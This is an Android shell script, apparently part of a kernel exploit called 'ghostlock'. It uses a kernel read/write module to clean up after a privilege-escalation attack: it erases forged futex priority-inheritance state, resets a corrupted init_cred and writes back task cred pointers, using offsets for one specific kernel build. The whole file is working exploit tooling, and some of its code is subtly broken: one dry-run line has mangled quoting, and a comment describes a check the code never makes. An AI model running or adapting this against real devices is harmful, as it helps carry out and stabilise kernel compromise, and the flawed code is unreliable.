#!/system/bin/sh
# cleanup-parked.sh — erase a parked ghostlock process's forged PI state with
# kread_min's /proc/kread + /proc/kwrite, verify the result, and only then let
# that process die.
#
# Why this is needed: the MulticastWaiter write leaves rb-tree links pointing at
# the forged objects and (for WriteMode::Credential) performs one collateral
# store into the object the value points at.  If the process that owns that
# state exits before it is erased, the kernel's <exit_pi_state_list> walk
# follows the forged pointers and wedges the machine (observed twice: exit=0,
# then screen frozen, adb dead, no panic).
#
# Prerequisites
#   * kread_min.ko loaded (finit_module) -> /proc/kread, /proc/kwrite exist
#   * uid 0 (the proc files are 0600); no capabilities needed
#   * the parked run's log, so the two addresses can be parsed, or pass them
#
# Usage
#   cleanup-parked.sh                 # dry run: read + print only (default)
#   cleanup-parked.sh --apply         # perform the writes, then verify
#   cleanup-parked.sh --apply <T> <IC>   # explicit task / init_cred addresses
#   GL_LOG=/path/to/log cleanup-parked.sh            # non-default log
#
# Offsets, this device (5.15.180-android13-8-o-01176-g6333b0dbc8ed):
#   task+0x5d8 pid            task+0x790 real_cred     task+0x798 cred
#   task+0x884 pi_lock        task+0x898 pi_waiters.rb_node
#   task+0x8a0 rb_leftmost    task+0x8a8 pi_top_task   task+0x8b0 pi_blocked_on
#   task+0x9a0 pi_state_list.next        task+0x9a8 pi_state_list.prev
#   pi_lock/pi_state_list offsets were read out of exit_pi_state_list
#   (add x20,x0,#0x884 / add x21,x0,#0x9a0); the pi_waiters/pi_top_task/
#   pi_blocked_on quartet comes from the device profile (task_pi_* fields),
#   which matches that disassembly.
#
# init_cred's first 8 bytes are {usage, uid}: restore {usage=4, uid=gid=0}.
# If you used WriteMode::Credential through the TCP zerocopy route instead, the
# collateral store landed on init_cred+8 = {gid, suid} -- also 0, so the same
# 16 zero bytes at init_cred cover both routes.

set -u

APPLY=0
[ "${1:-}" = "--apply" ] && { APPLY=1; shift; }

GL_LOG=${GL_LOG:-/data/local/tmp/gl-w1/w1c-self.log}
T=${1:-}
IC=${2:-}

if [ -z "$T" ] || [ -z "$IC" ]; then
    if [ -r "$GL_LOG" ]; then
        T=$(grep -a 'self task=0x' "$GL_LOG" | tail -1 | sed 's/.*self task=0x//' | cut -c1-16)
        IC=$(grep -a 'init_cred image=' "$GL_LOG" | tail -1 | sed 's/.*alias=0x//' | cut -c1-16)
    fi
fi
if [ -z "$T" ] || [ -z "$IC" ]; then
    echo "usage: $0 [--apply] <task_addr_hex> <init_cred_addr_hex>"
    echo "       (or set GL_LOG to a log containing 'self task=0x..' and 'init_cred image=.. alias=0x..')"
    exit 2
fi
if [ ! -r /proc/kread ] || [ ! -w /proc/kwrite ]; then
    echo "kread_min is not loaded: /proc/kread and /proc/kwrite must exist"
    exit 2
fi

T=${T#0x}
IC=${IC#0x}
echo "task      = 0x$T"
echo "init_cred = 0x$IC"
[ "$APPLY" = 1 ] && echo "mode      = APPLY (writes)" || echo "mode      = dry run (no writes; pass --apply)"

# ---------------------------------------------------------------- helpers ----
# addoff <64bit-hex> <decimal offset> -> 64bit hex (split so no 64-bit math in sh)
addoff() {
    hi=${1%????????}
    lo=${1#$hi}
    n=$((0x$lo + $2))
    if [ "$n" -gt 4294967295 ]; then
        n=$((n - 4294967296))
        hi=$(printf '%08x' $((0x$hi + 1)))
    fi
    printf '%s%08x' "$hi" "$n"
}

# le <hex> -> same value as memory-order byte pairs (little-endian)
le() {
    echo "$1" | sed 's/../& /g' | awk '{ for (i = NF; i >= 1; i--) printf "%s", $i }'
}

# kr <addr-hex> <len> -> value as hex, little-endian reassembled from the dump
kr() {
    echo "0x$1 $2" > /proc/kread
    cat /proc/kread | awk '
        /^[0-9a-f]+  / {
            s = ""
            for (i = 2; i <= NF; i++) {
                if (substr($i, 1, 1) == "|") break
                s = $i s
            }
            printf "%s", s
            exit
        }'
}

# kw <addr-hex> <memory-order-hexbytes> -> prints the driver's own read-back
kw() {
    echo "0x$1 $2" > /proc/kwrite
    cat /proc/kwrite | sed -n 1p
}

# zero-pad to 16 hex digits; a failed read therefore becomes all-zero, which is
# why every write that must not be all-zero is guarded by hexok() first
field() {
    printf '%016s' "${1:-0}" | tr ' ' '0'
}

hexok() { # hexok <string> -> true when it is exactly 16 lowercase hex digits
    [ ${#1} -eq 16 ] || return 1
    case "$1" in *[!0-9a-f]*) return 1 ;; esac
    return 0
}

# ------------------------------------------------------------------- read ----
RC_SAVE=$(kr "$(addoff "$T" 0x790)" 8)
CR_SAVE=$(kr "$(addoff "$T" 0x798)" 8)
IC0=$(kr "$IC" 16)
PS_NEXT=$(kr "$(addoff "$T" 0x9a0)" 8)
PS_PREV=$(kr "$(addoff "$T" 0x9a8)" 8)
PW_NODE=$(kr "$(addoff "$T" 0x898)" 8)
PW_LEFT=$(kr "$(addoff "$T" 0x8a0)" 8)
PW_TOP=$(kr "$(addoff "$T" 0x8a8)" 8)
PW_BLOCKED=$(kr "$(addoff "$T" 0x8b0)" 8)

echo "---- before ----"
echo "real_cred        = 0x$(field "$RC_SAVE")"
echo "cred             = 0x$(field "$CR_SAVE")"
echo "init_cred[0..16] = $IC0"
echo "pi_state_list    = 0x$(field "$PS_NEXT") / 0x$(field "$PS_PREV")"
echo "pi_waiters.node  = 0x$(field "$PW_NODE")"
echo "rb_leftmost      = 0x$(field "$PW_LEFT")"
echo "pi_top_task      = 0x$(field "$PW_TOP")"
echo "pi_blocked_on    = 0x$(field "$PW_BLOCKED")"

SELF=$(addoff "$T" 0x9a0)

if [ "$APPLY" != 1 ]; then
    echo "---- would write ----"
    echo "0x$SELF  $(le "$SELF")$(le "$SELF")          # pi_state_list self-link"
    echo "0x$(addoff "$T" 0x898)  00000000000000000000000000000000   # pi_waiters.rb_node + rb_leftmost"
    echo "0x$(addoff "$T" 0x8a8)  00000000000000000000000000000000   # pi_top_task + pi_blocked_on"
    echo "0x$IC  04000000000000000000000000000000   # usage=4, uid=gid=0"
    echo "0x$(addoff "$T" 0x790)  $(le "$field "$RC_SAVE")$(le "$field "$CR_SAVE")   # creds back to the backup"
    echo "(re-run with --apply)"
    exit 0
fi

# ------------------------------------------------------------------ write ----
echo "---- writing ----"
kw "$SELF" "$(le "$SELF")$(le "$SELF")"
kw "$(addoff "$T" 0x898)" "00000000000000000000000000000000"
kw "$(addoff "$T" 0x8a8)" "00000000000000000000000000000000"
kw "$IC" "04000000000000000000000000000000"
# only restore the creds if they actually point at init_cred (i.e. the write
# landed); otherwise leave the backup alone -- rewriting the same values is
# harmless, rewriting a *different* cred pointer you did not expect is not.
# Restore the creds, but only from a backup that actually read back as a pair of
# 64-bit values: a failed kread would otherwise turn into writing 16 zero bytes
# into task->cred and crash the machine.
if hexok "$RC_SAVE" && hexok "$CR_SAVE"; then
    kw "$(addoff "$T" 0x790)" "$(le "$RC_SAVE")$(le "$CR_SAVE")"
else
    echo "SKIP cred restore: backup read back as '0x$RC_SAVE' / '0x$CR_SAVE'"
fi

# ----------------------------------------------------------------- verify ----
PS_NEXT=$(kr "$(addoff "$T" 0x9a0)" 8)
PS_PREV=$(kr "$(addoff "$T" 0x9a8)" 8)
PW_NODE=$(kr "$(addoff "$T" 0x898)" 8)
PW_LEFT=$(kr "$(addoff "$T" 0x8a0)" 8)
PW_TOP=$(kr "$(addoff "$T" 0x8a8)" 8)
PW_BLOCKED=$(kr "$(addoff "$T" 0x8b0)" 8)
IC0=$(kr "$IC" 16)

echo "---- after ----"
echo "pi_state_list    = 0x$(field "$PS_NEXT") / 0x$(field "$PS_PREV")   (want 0x$(field "$SELF") twice)"
echo "pi_waiters.node  = 0x$(field "$PW_NODE")"
echo "rb_leftmost      = 0x$(field "$PW_LEFT")"
echo "pi_top_task      = 0x$(field "$PW_TOP")"
echo "pi_blocked_on    = 0x$(field "$PW_BLOCKED")"
echo "init_cred[0..16] = $IC0"

ok=1
[ "$(field "$PS_NEXT")" = "$(field "$SELF")" ] || ok=0
[ "$(field "$PS_PREV")" = "$(field "$SELF")" ] || ok=0
case "$PW_NODE" in *[!0]*) ok=0 ;; esac
case "$PW_LEFT" in *[!0]*) ok=0 ;; esac
case "$PW_TOP" in *[!0]*) ok=0 ;; esac
case "$PW_BLOCKED" in *[!0]*) ok=0 ;; esac
case "$IC0" in 04000000000000000000000000000000*) ;; *) ok=0 ;; esac

if [ "$ok" = 1 ]; then
    echo "RESULT: clean -- the parked process may now exit (or be killed)."
else
    echo "RESULT: NOT clean -- do NOT let the parked process exit; re-check the"
    echo "        fields above (a failed kread shows as a short/empty value)."
    exit 1
fi
